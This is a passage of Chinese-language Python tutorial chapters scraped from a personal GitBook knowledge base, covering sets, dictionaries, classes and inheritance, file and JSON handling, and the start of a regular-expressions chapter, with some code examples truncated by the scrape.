元组在创建时间和占用的空间上面都优于列表。我们可以使用sys模块的getsizeof函数来检查存储同样的元素的元组和列表各自占用了多少内存空间 使用集合 Python中的集合跟数学上的集合是一致的，不允许有重复元素，而且可以进行交集、并集、差集等运算。 def main(): set1 = {1, 2, 3, 3, 3, 2} print(set1) print('Length =', len(set1)) set2 = set(range(1, 10)) print(set2) set1.add(4) set1.add(5) set2.update([11, 12]) print(set1) print(set2) set2.discard(5) # remove的元素如果不存在会引发KeyError if 4 in set2: set2.remove(4) print(set2) # 遍历集合容器 for elem in set2: print(elem ** 2, end=' ') print() # 将元组转换成集合 set3 = set((1, 2, 3, 3, 2, 1)) print(set3.pop()) print(set3) # 集合的交集、并集、差集、对称差运算 print(set1 & set2) # print(set1.intersection(set2)) print(set1 | set2) # print(set1.union(set2)) print(set1 - set2) # print(set1.difference(set2)) print(set1 ^ set2) # print(set1.symmetric_difference(set2)) # 判断子集和超集 print(set2 = set2) # print(set1.issuperset(set2)) print(set1 >= set3) # print(set1.issuperset(set3)) if __name__ == '__main__': main() 说明：Python中允许通过一些特殊的方法来为某种类型或数据结构自定义运算符（后面的章节中会讲到），上面的代码中我们对集合进行运算的时候可以调用集合对象的方法，也可以直接使用对应的运算符，例如&运算符跟intersection方法的作用就是一样的，但是使用运算符让代码更加直观。 使用字典 字典是另一种可变容器模型，类似于我们生活中使用的字典，它可以存储任意类型对象，与列表、集合不同的是，字典的每个元素都是由一个键和一个值组成的“键值对”，键和值通过冒号分开。下面的代码演示了如何定义和使用字典。 def main(): scores = {'aaron': 95, '白元芳': 78, '狄仁杰': 82} # 通过键可以获取字典中对应的值 print(scores['aaron']) print(scores['狄仁杰']) # 对字典进行遍历(遍历的其实是键再通过键取对应的值) for elem in scores: print('%s\\t--->\\t%d' % (elem, scores[elem])) # 更新字典中的元素 scores['白元芳'] = 65 scores['诸葛王朗'] = 71 scores.update(冷面=67, 方启鹤=85) print(scores) if '武则天' in scores: print(scores['武则天']) print(scores.get('武则天')) # get方法也是通过键获取对应的值但是可以设置默认值 print(scores.get('武则天', 60)) # 删除字典中的元素 print(scores.popitem()) print(scores.popitem()) print(scores.pop('aaron', 100)) # 清空字典 scores.clear() print(scores) if __name__ == '__main__': main() 练习 练习1：在屏幕上显示跑马灯文字 import os import time def main(): s = 'hello world' while True: os.system('cls') print(s) time.sleep(0.2) s = s[1:] + s[0] if __name__ == '__main__': main() 练习2：设计一个函数产生指定长度的验证码，验证码由大小写字母和数字构成 import random def main(): all_chars = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' length = len(all_chars) - 1 code = '' for _ in range(4): index = random.randint(0, length) code += all_chars[index] print(code) if __name__ == '__main__': main() 练习3：设计一个函数返回给定文件名的后缀名 def main(): filename = input('type filename: ') index = filename.rfind('.') print(filename[index+1:]) if __name__ == '__main__': main() 练习4：设计一个函数返回传入的列表中最大和第二大的元素的值 def findIts(x): maxListX = max(x) y = x[:] y.remove(maxListX) maxListY = max(y) return maxListX, maxListY def main(): x = findIts([1, 32, 56, 12, 45]) print(x) if __name__ == '__main__': main() 练习5:打印杨辉三角 def main(): row = int(input('row = ')) yh = [[]] * row for i in range(row): yh[i] = [None] * (i + 1) for j in range(i+1): if j == i or j == 0: yh[i][j] = 1 else: yh[i][j] = yh[i-1][j-1] + yh[i-1][j] for x in yh: for y in x: print(y, end=' ') print(end='\\n') if __name__ == '__main__': main() 练习6: 约瑟夫环问题 description 《幸运的基督徒》 有15个基督徒和15个非基督徒在海上遇险，为了能让一部分人活下来不得不将其中15个人扔到海里面去，有个人想了个办法就是大家围成一个圈，由某个人开始从1报数，报到9的人就扔到海里面，他后面的人接着从1开始报数，报到9的人继续扔到海里面，直到扔掉15个人。由于上帝的保佑，15个基督徒都幸免于难，问这些人最开始是怎么站的，哪些位置是基督徒哪些位置是非基督徒。 n = int(input('n = ')) m = int(input('m = ')) listMan = [True] * n droop = 0 count = 0 index = 0 while droop 列表移动，判断是否已经移除（置false），若未移除（true），则报数count+=1，否则不能报数 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2020-03-27 17:33:30 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/02.Python/05-字符串和常用数据结构.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/02.Python/06-面向对象编程基础.html":{"url":"知识库/04.编程开发/02.Python/06-面向对象编程基础.html","title":"06-面向对象编程基础","keywords":"","body":" 创建和使用对象 访问可见性问题 面向对象的支柱 练习 练习1 定义一个类描述数字时钟 练习2：定义一个类描述平面上的点并提供移动点和计算到另一个点距离的方法。 面向对象编程基础 在Python中可以使用class关键字定义类，然后在类中通过之前学习过的函数来定义方法，这样就可以将对象的动态特征描述出来，代码如下所示。 class Student(object): # __init__是一个特殊方法用于在创建对象时进行初始化操作 # 通过这个方法我们可以为学生对象绑定name和age两个属性 def __init__(self, name, age): self.name = name self.age = age def study(self, course_name): print('%s正在学习%s.' % (self.name, course_name)) # PEP 8要求标识符的名字用全小写多个单词用下划线连接 # 但是很多程序员和公司更倾向于使用驼峰命名法(驼峰标识) def watch_av(self): if self.age 创建和使用对象 当我们定义好一个类之后，可以通过下面的方式来创建对象并给对象发消息 stu = Student('aaron', 18) stu.study('math') stu.watch_av() 访问可见性问题 对于上面的代码，有C++、Java、C#等编程经验的程序员可能会问，我们给Student对象绑定的name和age属性到底具有怎样的访问权限（也称为可见性）。因为在很多面向对象编程语言中，我们通常会将对象的属性设置为私有的（private）或受保护的（protected），简单的说就是不允许外界访问，而对象的方法通常都是公开的（public），因为公开的方法就是对象能够接受的消息。在Python中，属性和方法的访问权限只有两种，也就是公开的和私有的，如果希望属性是私有的，在给属性命名时可以用两个下划线作为开头，下面的代码可以验证这一点。 class Student: def __init__(self, foo): self.__foo = foo def __bar(self): print(self.__foo) print('__bar') def main(): test = Student('hello') test._Student__bar() print(test._Student__foo) if __name__ == \"__main__\": main() 在实际开发中，我们并不建议将属性设置为私有的，因为这会导致子类无法访问（后面会讲到）。所以大多数Python程序员会遵循一种命名惯例就是让属性名以单下划线开头来表示属性是受保护的，本类之外的代码在访问这样的属性时应该要保持慎重。这种做法并不是语法上的规则，单下划线开头的属性和方法外界仍然是可以访问的，所以更多的时候它是一种暗示或隐喻，关于这一点可以看看我的《Python - 那些年我们踩过的那些坑》文章中的讲解 面向对象的支柱 面向对象有三大支柱：封装、继承和多态。后面两个概念在下一个章节中进行详细的说明，这里我们先说一下什么是封装。我自己对封装的理解是“隐藏一切可以隐藏的实现细节，只向外界暴露（提供）简单的编程接口”。我们在类中定义的方法其实就是把数据和对数据的操作封装起来了，在我们创建了对象之后，只需要给对象发送一个消息（调用方法）就可以执行方法中的代码，也就是说我们只需要知道方法的名字和传入的参数（方法的外部视图），而不需要知道方法内部的实现细节（方法的内部视图）。 练习 练习1 定义一个类描述数字时钟 ''' @Description: @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-19 14:23:34 @LastEditors: AaronLuo @LastEditTime: 2020-03-19 15:12:11 ''' from time import sleep class Clock(object): def __init__(self, hour=0, minute=0, second=0): self.hour = hour self.minute = minute self.second = second def showTime(self): print('%02d:%02d:%02d' % (self.hour, self.minute, self.second)) # print(self.hour, ':', self.minute, ':', self.second) def caculate(self): self.second += 1 if self.second == 60: self.minute += 1 self.second = 0 if self.second == 60: self.hour += 1 self.minute = 0 if self.hour == 24: self.hour = 0 time = Clock(15, 6, 34) while True: time.caculate() sleep(1) time.showTime() 练习2：定义一个类描述平面上的点并提供移动点和计算到另一个点距离的方法。 ''' @Description: @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-19 14:23:34 @LastEditors: AaronLuo @LastEditTime: 2020-03-19 15:31:45 ''' from math import sqrt class Point(object): def __init__(self, x=0, y=0): self.x = x self.y = y def moveTo(self, x, y): self.x = x self.y = y def moveBy(self, dx, dy): self.x += dx self.y += dy def distanceTo(self, this): return sqrt((self.x - this.x)**2 + (self.y - this.y) ** 2) def __str__(self): return '(%s,%s)' % (str(self.x), str(self.y)) p1 = Point(3, 4) p2 = Point() print(p1) print(p1.distanceTo(p2)) Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2020-03-19 15:32:04 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/02.Python/06-面向对象编程基础.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/02.Python/07-面向对象进阶.html":{"url":"知识库/04.编程开发/02.Python/07-面向对象进阶.html","title":"07-面向对象进阶","keywords":"","body":" @property装饰器 slots魔法 静态方法和类方法 类之间的关系 继承和多态 面向对象进阶 在前面的章节我们已经了解了面向对象的入门知识，知道了如何定义类，如何创建对象以及如何给对象发消息。为了能够更好的使用面向对象编程思想进行程序开发，我们还需要对Python中的面向对象编程进行更为深入的了解。 @property装饰器 之前我们讨论过Python中属性和方法访问权限的问题，虽然我们不建议将属性设置为私有的，但是如果直接将属性暴露给外界也是有问题的，比如我们没有办法检查赋给属性的值是否有效。我们之前的建议是将属性命名以单下划线开头，通过这种方式来暗示属性是受保护的，不建议外界直接访问，那么如果想访问属性可以通过属性的getter（访问器）和setter（修改器）方法进行对应的操作。如果要做到这点，就可以考虑使用@property包装器来包装getter和setter方法，使得对属性的访问既安全又方便，代码如下所示。 ''' @Description: @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-19 15:36:25 @LastEditors: AaronLuo @LastEditTime: 2020-03-19 15:51:16 ''' class Person(object): def __init__(self, name, age): self._name = name self._age = age @property def name(self): return self.name @property def age(self): return self._age @name.setter def name(self, name): self.name = name @age.setter def age(self, age): self._age = age def paly(self): if self._age __slots__魔法 我们讲到这里，不知道大家是否已经意识到，Python是一门动态语言。通常，动态语言允许我们在程序运行时给对象绑定新的属性或方法，当然也可以对已经绑定的属性和方法进行解绑定。但是如果我们需要限定自定义类型的对象只能绑定某些属性，可以通过在类中定义__slots__变量来进行限定。需要注意的是__slots__的限定只对当前类的对象生效，对子类并不起任何作用 ''' @Description: @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-19 15:36:25 @LastEditors: AaronLuo @LastEditTime: 2020-03-19 16:03:18 ''' class Person(object): __slots__ = ('_name', '_age', '_gender') def __init__(self, name, age): self._name = name self._age = age @property def name(self): return self.name @property def age(self): return self._age # @property # def gender(self): # return self._gender @name.setter def name(self, name): self.name = name @age.setter def age(self, age): self._age = age # @gender.setter # def gender(self, gender): # self._gender = gender def paly(self): if self._age 静态方法和类方法 之前，我们在类中定义的方法都是对象方法，也就是说这些方法都是发送给对象的消息。实际上，我们写在类中的方法并不需要都是对象方法，例如我们定义一个“三角形”类，通过传入三条边长来构造三角形，并提供计算周长和面积的方法，但是传入的三条边长未必能构造出三角形对象，因此我们可以先写一个方法来验证三条边长是否可以构成三角形，这个方法很显然就不是对象方法，因为在调用这个方法时三角形对象尚未创建出来（因为都不知道三条边能不能构成三角形），所以这个方法是属于三角形类而并不属于三角形对象的。我们可以使用静态方法来解决这类问题，代码如下所示 @staticmethod定义静态方法 from math import sqrt class Triangle(object): def __init__(self, a, b, c): self._a = a self._b = b self._c = c @staticmethod def is_valid(a, b, c): return a + b > c and b + c > a and a + c > b def perimeter(self): return self._a + self._b + self._c def area(self): half = self.perimeter() / 2 return sqrt(half * (half - self._a) * (half - self._b) * (half - self._c)) def main(): a, b, c = 3, 4, 5 # 静态方法和类方法都是通过给类发消息来调用的 if Triangle.is_valid(a, b, c): t = Triangle(a, b, c) print(t.perimeter()) # 也可以通过给类发消息来调用对象方法但是要传入接收消息的对象作为参数 # print(Triangle.perimeter(t)) print(t.area()) # print(Triangle.area(t)) else: print('无法构成三角形.') if __name__ == '__main__': main() 和静态方法比较类似，Python还可以在类中定义类方法，类方法的第一个参数约定名为cls，它代表的是当前类相关的信息的对象（类本身也是一个对象，有的地方也称之为类的元数据对象），通过这个参数我们可以获取和类相关的信息并且可以创建出类的对象，代码如下所示 from time import time, localtime, sleep class Clock(object): \"\"\"数字时钟\"\"\" def __init__(self, hour=0, minute=0, second=0): self._hour = hour self._minute = minute self._second = second @classmethod def now(cls): ctime = localtime(time()) return cls(ctime.tm_hour, ctime.tm_min, ctime.tm_sec) def run(self): \"\"\"走字\"\"\" self._second += 1 if self._second == 60: self._second = 0 self._minute += 1 if self._minute == 60: self._minute = 0 self._hour += 1 if self._hour == 24: self._hour = 0 def show(self): \"\"\"显示时间\"\"\" return '%02d:%02d:%02d' % \\ (self._hour, self._minute, self._second) def main(): # 通过类方法创建对象并获取系统时间 clock = Clock.now() while True: print(clock.show()) sleep(1) clock.run() if __name__ == '__main__': main() 类之间的关系 简单的说，类和类之间的关系有三种：is-a、has-a和use-a关系。 is-a关系也叫继承或泛化，比如学生和人的关系、手机和电子产品的关系都属于继承关系。 has-a关系通常称之为关联，比如部门和员工的关系，汽车和引擎的关系都属于关联关系；关联关系如果是整体和部分的关联，那么我们称之为聚合关系；如果整体进一步负责了部分的生命周期（整体和部分是不可分割的，同时同在也同时消亡），那么这种就是最强的关联关系，我们称之为合成关系。 use-a关系通常称之为依赖，比如司机有一个驾驶的行为（方法），其中（的参数）使用到了汽车，那么司机和汽车的关系就是依赖关系。 我们可以使用一种叫做UML（统一建模语言）的东西来进行面向对象建模，其中一项重要的工作就是把类和类之间的关系用标准化的图形符号描述出来。关于UML我们在这里不做详细的介绍，有兴趣的读者可以自行阅读《UML面向对象设计基础》一书。 利用类之间的这些关系，我们可以在已有类的基础上来完成某些操作，也可以在已有类的基础上创建新的类，这些都是实现代码复用的重要手段。复用现有的代码不仅可以减少开发的工作量，也有利于代码的管理和维护，这是我们在日常工作中都会使用到的技术手段。 继承和多态 刚才我们提到了，可以在已有类的基础上创建新类，这其中的一种做法就是让一个类从另一个类那里将属性和方法直接继承下来，从而减少重复代码的编写。提供继承信息的我们称之为父类，也叫超类或基类；得到继承信息的我们称之为子类，也叫派生类或衍生类。子类除了继承父类提供的属性和方法，还可以定义自己特有的属性和方法，所以子类比父类拥有的更多的能力，在实际开发中，我们经常会用子类对象去替换掉一个父类对象，这是面向对象编程中一个常见的行为，对应的原则称之为里氏替换原则。下面我们先看一个继承的例子。 class Person(object): \"\"\"人\"\"\" def __init__(self, name, age): self._name = name self._age = age @property def name(self): return self._name @property def age(self): return self._age @age.setter def age(self, age): self._age = age def play(self): print('%s正在愉快的玩耍.' % self._name) def watch_av(self): if self._age >= 18: print('%s正在观看爱情动作片.' % self._name) else: print('%s只能观看《熊出没》.' % self._name) class Student(Person): \"\"\"学生\"\"\" def __init__(self, name, age, grade): super().__init__(name, age) self._grade = grade @property def grade(self): return self._grade @grade.setter def grade(self, grade): self._grade = grade def study(self, course): print('%s的%s正在学习%s.' % (self._grade, self._name, course)) class Teacher(Person): \"\"\"老师\"\"\" def __init__(self, name, age, title): super().__init__(name, age) self._title = title @property def title(self): return self._title @title.setter def title(self, title): self._title = title def teach(self, course): print('%s%s正在讲%s.' % (self._name, self._title, course)) def main(): stu = Student('王大锤', 15, '初三') stu.study('数学') stu.watch_av() t = Teacher('骆昊', 38, '老叫兽') t.teach('Python程序设计') t.watch_av() if __name__ == '__main__': main() 子类在继承了父类的方法后，可以对父类已有的方法给出新的实现版本，这个动作称之为方法重写（override）。通过方法重写我们可以让父类的同一个行为在子类中拥有不同的实现版本，当我们调用这个经过子类重写的方法时，不同的子类对象会表现出不同的行为，这个就是多态（poly-morphism）。 ''' @Description: none @Version: 1.0 @Autor: AaronLuo @Date: 2020-03-19 15:36:25 @LastEditors: AaronLuo @LastEditTime: 2020-03-19 18:07:44 ''' # 实现抽象类的包 from abc import ABCMeta, abstractmethod class Pet(object, metaclass=ABCMeta): \"\"\"宠物\"\"\" def __init__(self, nickname): self._nickname = nickname @abstractmethod def make_voice(self): \"\"\"发出声音\"\"\" pass class Dog(Pet): \"\"\"狗\"\"\" def make_voice(self): print('%s: 汪汪汪...' % self._nickname) class Cat(Pet): \"\"\"猫\"\"\" def make_voice(self): print('%s: 喵...喵...' % self._nickname) def main(): pets = [Dog('旺财'), Cat('凯蒂'), Dog('大黄')] for pet in pets: pet.make_voice() if __name__ == '__main__': main() 在上面的代码中，我们将Pet类处理成了一个抽象类，所谓抽象类就是不能够创建对象的类，这种类的存在就是专门为了让其他类去继承它。Python从语法层面并没有像Java或C#那样提供对抽象类的支持，但是我们可以通过abc模块的ABCMeta元类和abstractmethod包装器来达到抽象类的效果，如果一个类中存在抽象方法那么这个类就不能够实例化（创建对象）。上面的代码中，Dog和Cat两个子类分别对Pet类中的make_voice抽象方法进行了重写并给出了不同的实现版本，当我们在main函数中调用该方法时，这个方法就表现出了多态行为（同样的方法做了不同的事情）。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2020-03-19 18:21:10 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/02.Python/07-面向对象进阶.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/02.Python/08-文件和异常.html":{"url":"知识库/04.编程开发/02.Python/08-文件和异常.html","title":"08-文件和异常","keywords":"","body":" 读写文本文件 读写二进制文件 读写JSON文件 文件和异常 在实际开发中，常常需要对程序中的数据进行持久化操作，而实现数据持久化最直接简单的方式就是将数据保存到文件中。说到“文件”这个词，可能需要先科普一下关于文件系统的知识，对于这个概念，维基百科上给出了很好的诠释，这里不再浪费笔墨。 在Python中实现文件的读写操作其实非常简单，通过Python内置的open函数，我们可以指定文件名、操作模式、编码信息等来获得操作文件的对象，接下来就可以对文件进行读写操作了。这里所说的操作模式是指要打开什么样的文件（字符文件还是二进制文件）以及做什么样的操作（读、写还是追加），具体的如下表所示。 操作模式 具体含义 'r' 读取 （默认） 'w' 写入（会先截断之前的内容） 'x' 写入，如果文件已经存在会产生异常 'a' 追加，将内容写入到已有文件的末尾 'b' 二进制模式 't' 文本模式（默认） '+' 更新（既可以读又可以写） 读写文本文件 读取文本文件时，需要在使用open函数时指定好带路径的文件名（可以使用相对路径或绝对路径）并将文件模式设置为'r'（如果不指定，默认值也是'r'），然后通过encoding参数指定编码（如果不指定，默认值是None，那么在读取文件时使用的是操作系统默认的编码），如果不能保证保存文件时使用的编码方式与encoding参数指定的编码方式是一致的，那么就可能因无法解码字符而导致读取失败。下面的例子演示了如何读取一个纯文本文件。 def main(): f = open('hello.txt', 'r', encoding='utf-8') print(f.read()) f.close() if __name__ == '__main__': main() 请注意上面的代码，如果open函数指定的文件并不存在或者无法打开，那么将引发异常状况导致程序崩溃。为了让代码有一定的健壮性和容错性，我们可以使用Python的异常机制对可能在运行时发生状况的代码进行适当的处理，如下所示。 def main(): f = None try: f = open('hello.txt', 'r', encoding='utf-8') print(f.read()) except FileNotFoundError: print('无法打开指定的文件!') except LookupError: print('指定了未知的编码!') except UnicodeDecodeError: print('读取文件时解码错误!') finally: if f: f.close() if __name__ == '__main__': main() 在Python中，我们可以将那些在运行时可能会出现状况的代码放在try代码块中，在try代码块的后面可以跟上一个或多个except来捕获可能出现的异常状况。例如在上面读取文件的过程中，文件找不到会引发FileNotFoundError，指定了未知的编码会引发LookupError，而如果读取文件时无法按指定方式解码会引发UnicodeDecodeError，我们在try后面跟上了三个except分别处理这三种不同的异常状况。最后我们使用finally代码块来关闭打开的文件，释放掉程序中获取的外部资源，由于finally块的代码不论程序正常还是异常都会执行到（甚至是调用了sys模块的exit函数退出Python环境，finally块都会被执行，因为exit函数实质上是引发了SystemExit异常），因此我们通常把finally块称为“总是执行代码块”，它最适合用来做释放外部资源的操作。如果不愿意在finally代码块中关闭文件对象释放资源，也可以使用上下文语法，通过with关键字指定文件对象的上下文环境并在离开上下文环境时自动释放文件资源，代码如下所示 def main(): try: with open('hello.txt', 'r', encoding='utf-8') as f: print(f.read()) except FileNotFoundError: print('无法打开指定的文件!') except LookupError: print('指定了未知的编码!') except UnicodeDecodeError: print('读取文件时解码错误!') if __name__ == '__main__': main() 除了使用文件对象的read方法读取文件之外，还可以使用for-in循环逐行读取或者用readlines方法将文件按行读取到一个列表容器中，代码如下所示 import time def main(): # 一次性读取整个文件内容 with open('hello.txt', 'r', encoding='utf-8') as f: print(f.read()) # 通过for-in循环逐行读取 with open('hello.txt', 'r', encoding='utf-8') as f: for line in f: print(line, end='') time.sleep(0.5) print() # 读取文件按行读取到列表中 with open('hello.txt', 'r', encoding='utf-8') as f: lines = f.readlines() print(lines) if __name__ == '__main__': main() 要将文本信息写入文件文件也非常简单，在使用open函数时指定好文件名并将文件模式设置为'w'即可。注意如果需要对文件内容进行追加式写入，应该将模式设置为'a'。如果要写入的文件不存在会自动创建文件而不是引发异常。下面的例子演示了如何将1-9999直接的素数分别写入三个文件中（1-99之间的素数保存在a.txt中，100-999之间的素数保存在b.txt中，1000-9999之间的素数保存在c.txt中）。 from math import sqrt def is_prime(n): \"\"\"判断素数的函数\"\"\" assert n > 0 for factor in range(2, int(sqrt(n)) + 1): if n % factor == 0: return False return True if n != 1 else False def main(): filenames = ('a.txt', 'b.txt', 'c.txt') fs_list = [] try: for filename in filenames: fs_list.append(open(filename, 'w', encoding='utf-8')) for number in range(1, 10000): if is_prime(number): if number 读写二进制文件 知道了如何读写文本文件要读写二进制文件也就很简单了，下面的代码实现了复制图片文件的功能。 def main(): try: with open('guido.jpg', 'rb') as fs1: data = fs1.read() print(type(data)) # with open('吉多.jpg', 'wb') as fs2: fs2.write(data) except FileNotFoundError as e: print('指定的文件无法打开.') except IOError as e: print('读写文件时出现错误.') print('程序执行结束.') if __name__ == '__main__': main() 读写JSON文件 通过上面的讲解，我们已经知道如何将文本数据和二进制数据保存到文件中，那么这里还有一个问题，如果希望把一个列表或者一个字典中的数据保存到文件中又该怎么做呢？答案是将数据以JSON格式进行保存。JSON是“JavaScript Object Notation”的缩写，它本来是JavaScript语言中创建对象的一种字面量语法，现在已经被广泛的应用于跨平台跨语言的数据交换，原因很简单，因为JSON也是纯文本，任何系统任何编程语言处理纯文本都是没有问题的。目前JSON基本上已经取代了XML作为异构系统间交换数据的事实标准。关于JSON的知识，更多的可以参考JSON的官方网站，从这个网站也可以了解到每种语言处理JSON数据格式可以使用的工具或三方库，下面是一个JSON的简单例子。 { \"name\": \"骆昊\", \"age\": 38, \"qq\": 957658, \"friends\": [\"王大锤\", \"白元芳\"], \"cars\": [ {\"brand\": \"BYD\", \"max_speed\": 180}, {\"brand\": \"Audi\", \"max_speed\": 280}, {\"brand\": \"Benz\", \"max_speed\": 320} ] } import json import requests def main(): with open('hello.json', 'r', encoding='utf-8') as f: jsonString = f.read() dictJson = json.loads(jsonString) print(dictJson['name']) if __name__ == '__main__': main() json模块主要有四个比较重要的函数，分别是： dump - 将Python对象按照JSON格式序列化到文件中 dumps - 将Python对象处理成JSON格式的字符串 load - 将文件中的JSON数据反序列化成对象 loads - 将字符串的内容反序列化成Python对象 这里出现了两个概念，一个叫序列化，一个叫反序列化。自由的百科全书维基百科上对这两个概念是这样解释的：“序列化（serialization）在计算机科学的数据处理中，是指将数据结构或对象状态转换为可以存储或传输的形式，这样在需要的时候能够恢复到原先的状态，而且通过序列化的数据重新获取字节时，可以利用这些字节来产生原始对象的副本（拷贝）。与这个过程相反的动作，即从一系列字节中提取数据结构的操作，就是反序列化（deserialization）”。 目前绝大多数网络数据服务（或称之为网络API）都是基于HTTP协议提供JSON格式的数据，关于HTTP协议的相关知识，可以看看阮一峰老师的《HTTP协议入门》，如果想了解国内的网络数据服务，可以看看聚合数据和阿凡达数据等网站，国外的可以看看{API}Search网站。下面的例子演示了如何使用requests模块（封装得足够好的第三方网络访问模块）访问网络API获取国内新闻，如何通过json模块解析JSON数据 import json import requests def main(): req = requests.get('http://127.0.0.1:8080/test') print(json.loads(req.text)['name']) if __name__ == '__main__': main() 在Python中要实现序列化和反序列化除了使用json模块之外，还可以使用pickle和shelve模块，但是这两个模块是使用特有的序列化协议来序列化数据，因此序列化后的数据只能被Python识别。关于这两个模块的相关知识可以自己看看网络上的资料。另外，如果要了解更多的关于Python异常机制的知识，可以看看segmentfault上面的文章《总结：Python中的异常处理》，这篇文章不仅介绍了Python中异常机制的使用，还总结了一系列的最佳实践，很值得一读。 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2020-03-20 21:45:54 Author: aaron Url: https://byaaronluo.github.io/知识库/04.编程开发/02.Python/08-文件和异常.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/04.编程开发/02.Python/09-字符串和正则表达式.html":{"url":"知识库/04.编程开发/02.Python/09-字符串和正则表达式.html","title":"09-字符串和正则表达式","keywords":"","body":" Python对正则表达式的支持 例子1：验证输入用户名和QQ号是否有效并给出对应的提示信息。 例子2：从一段文字中提取出国内手机号码。 例子3：替换字符串中的不良内容 例子4：拆分长字符串 后话 字符串和正则表达式 在编写处理字符串的程序或网页时，经常会有查找符合某些复杂规则的字符串的需要，正则表达式就是用于描述这些规则的工具，换句话说正则表达式是一种工具，它定义了字符串的匹配模式（如何检查一个字符串是否有跟某种模式匹配的部分或者从一个字符串中将与模式匹配的部分提取出来或者替换掉）。如果你在Windows操作系统中使用过文件查找并且在指定文件名时使用过通配符（*和?），那么正则表达式也是与之类似的用来进行文本匹配的工具，只不过比起通配符正则表达式更强大，它能更精确地描述你的需求（当然你付出的代价是书写一个正则表达式比打出一个通配符要复杂得多，要知道任何给你带来好处的东西都是有代价的，就如同学习一门编程语言一样），比如你可以编写一个正则表达式，用来查找所有以0开头，后面跟着2-3个数字，然后是一个连字号“-”，最后是7或8位数字的字符串（像028-12345678或0813-7654321），这不就是国内的座机号码吗。最初计算机是为了做数学运算而诞生的，处理的信息基本上都是数值，而今天我们在日常工作中处理的信息基本上都是文本数据，我们希望计算机能够识别和处理符合某些模式的文本，正则表达式就显得非常重要了。今天几乎所有的编程语言都提供了对正则表达式操作的支持，Python通过标准库中的re模块来支持正则表达式操作。 我们可以考虑下面一个问题：我们从某个地方（可能是一个文本文件，也可能是网络上的一则新闻）获得了一个字符串，希望在字符串中找出手机号和座机号。当然我们可以设定手机号是11位的数字（注意并不是随机的11位数字，因为你没有见过“25012345678”这样的手机号吧）而座机号跟上一段中描述的模式相同，如果不使用正则表达式要完成这个任务就会很麻烦。 关于正则表达式的相关知识，大家可以阅读一篇非常有名的博客叫《正则表达式30分钟入门教程》，读完这篇文章后你就可以看懂下面的表格，这是我们对正则表达式中的一些基本符号进行的扼要总结。 符号 解释 示例 说明 . 匹配任意字符 b.t 可以匹配bat / but / b#t / b1t等 \\w 匹配字母/数字/下划线 b\\wt 可以匹配bat / b1t / b_t等 但不能匹配b#t \\s 匹配空白字符（包括\\r、\\n、\\t等） love\\syou 可以匹配love you \\d 匹配数字 \\d\\d 可以匹配01 / 23 / 99等 \\b 匹配单词的边界 \\bThe\\b ^ 匹配字符串的开始 ^The 可以匹配The开头的字符串 $ 匹配字符串的结束 .exe$ 可以匹配.exe结尾的字符串 \\W 匹配非字母/数字/下划线 b\\Wt 可以匹配b#t / b@t等 但不能匹配but / b1t / b_t等 \\S 匹配非空白字符 love\\Syou 可以匹配love#you等 但不能匹配love you \\D 匹配非数字 \\d\\D 可以匹配9a / 3# / 0F等 \\B 匹配非单词边界 \\Bio\\B [] 匹配来自字符集的任意单一字符 [aeiou] 可以匹配任一元音字母字符 匹配不在字符集中的任意单一字符 aeiou 可以匹配任一非元音字母字符 * 匹配0次或多次 \\w* + 匹配1次或多次 \\w+ ? 匹配0次或1次 \\w? {N} 匹配N次 \\w{3} {M,} 匹配至少M次 \\w{3,} {M,N} 匹配至少M次至多N次 \\w{3,6} \\ 分支 foo\\ bar 可以匹配foo或者bar (?#) 注释 (exp) 匹配exp并捕获到自动命名的组中 (?exp) 匹配exp并捕获到名为name的组中 (?:exp) 匹配exp但是不捕获匹配的文本 (?=exp) 匹配exp前面的位置 \\b\\w+(?=ing) 可以匹配I'm dancing中的danc (? 匹配exp后面的位置 (? 可以匹配I love dancing and reading中的第一个ing (?!exp) 匹配后面不是exp的位置 (? 匹配前面不是exp的位置 *? 重复任意次，但尽可能少重复 a.b a.?b 将正则表达式应用于aabab，前者会匹配整个字符串aabab，后者会匹配aab和ab两个字符串 +? 重复1次或多次，但尽可能少重复 ?? 重复0次或1次，但尽可能少重复 {M,N}? 重复M到N次，但尽可能少重复 {M,}? 重复M次以上，但尽可能少重复 Python对正则表达式的支持 Python提供了re模块来支持正则表达式相关操作，下面是re模块中的核心函数 函数 说明 compile(pattern, flags=0) 编译正则表达式返回正则表达式对象 match(pattern, string, flags=0) 用正则表达式匹配字符串 成功返回匹配对象 否则返回None search(pattern, string, flags=0) 搜索字符串中第一次出现正则表达式的模式 成功返回匹配对象 否则返回None split(pattern, string, maxsplit=0, flags=0) 用正则表达式指定的模式分隔符拆分字符串 返回列表 sub(pattern, repl, string, count=0, flags=0) 用指定的字符串替换原字符串中与正则表达式匹配的模式 可以用count指定替换的次数 fullmatch(pattern, string, flags=0) match函数的完全匹配（从字符串开头到结尾）版本 findall(pattern, string, flags=0) 查找字符串所有与正则表达式匹配的模式 返回字符串的列表 finditer(pattern, string, flags=0) 查找字符串所有与正则表达式匹配的模式 返回一个迭代器 purge() 清除隐式编译的正则表达式的缓存 re.I / re.IGNORECASE 忽略大小写匹配标记 re.M / re.MULTILINE 多行匹配标记 说明：上面提到的re模块中的这些函数，实际开发中也可以用正则表达式对象的方法替代对这些函数的使用，如果一个正则表达式需要重复的使用，那么先通过compile函数编译正则表达式并创建出正则表达式对象无疑是更为明智的选择。 例子1：验证输入用户名和QQ号是否有效并给出对应的提示信息。 \"\"\" 